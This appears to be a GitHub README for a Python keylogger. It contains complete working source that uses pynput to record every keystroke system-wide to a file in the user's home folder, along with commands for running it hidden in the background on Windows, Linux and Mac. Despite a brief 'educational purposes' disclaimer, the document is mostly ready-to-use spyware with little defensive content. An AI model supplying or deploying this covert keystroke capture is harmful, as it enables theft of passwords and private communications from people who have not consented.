# Keylogger in Python

## Overview
This project is a simple keylogger built using Python and the `pynput` library. It captures keystrokes globally from any application and logs them into a file. The goal of this project is to understand how keyloggers work and how to defend against them.

⚠ **Disclaimer:** This project is for educational purposes only. Unauthorized use of keyloggers is illegal. Always obtain consent before running this software.

## Features
- Captures all keystrokes from anywhere on the system.
- Logs keystrokes to a text file.
- Ignores special keys like the **Windows key**.
- Runs in the background as a hidden process.

## Prerequisites
Ensure you have Python installed on your system. You can check by running:
```sh
python --version
```

## Installation
1. Clone this repository:
   ```sh
   git clone https://github.com/yourusername/keylogger-python.git
   cd keylogger-python
   ```

2. Install dependencies:
   ```sh
   pip install pynput
   ```

## Usage
### Running the Keylogger
Run the script as a background process:
```sh
python keylogger.py
```

#### Windows (Run Hidden)
```sh
pythonw keylogger.py
```

#### Linux/Mac (Run in Background)
```sh
nohup python3 keylogger.py & disown
```

### Stopping the Keylogger
#### Windows
1. Open **Task Manager** (`Ctrl + Shift + Esc`)
2. Find `python.exe` or `pythonw.exe`
3. **Right-click > End Task**

#### Linux/Mac
1. Run:
   ```sh
   ps aux | grep python
   ```
2. Find the **PID (process ID)** and kill it:
   ```sh
   kill -9 <PID>
   ```

## Where Are Keystrokes Saved?
- **Windows:** `C:\Users\<YourUsername>\keylog.txt`
- **Linux/Mac:** `~/keylog.txt`

## Code Explanation
```python
from pynput.keyboard import Listener, Key
import os

# File to save keystrokes
log_file = os.path.expanduser("~") + "/keylog.txt"

def on_press(key):
    try:
        if key in [Key.cmd, Key.cmd_l, Key.cmd_r]:
            return  # Ignore Windows key
        with open(log_file, "a") as f:
            if isinstance(key, Key):
                f.write(f"[{key.name}] ")
            else:
                f.write(f"{str(key).replace('\'', '')} ")
    except Exception as e:
        print(f"Error: {e}")

# Start listener globally
with Listener(on_press=on_press) as listener:
    listener.join()
```

## License
This project is licensed under the MIT License. See `LICENSE` for details.

## Contribution
Feel free to fork this project and submit pull requests. Suggestions are always welcome!

## Contact
For any inquiries, reach out at [your-email@example.com](mailto:your-email@example.com).

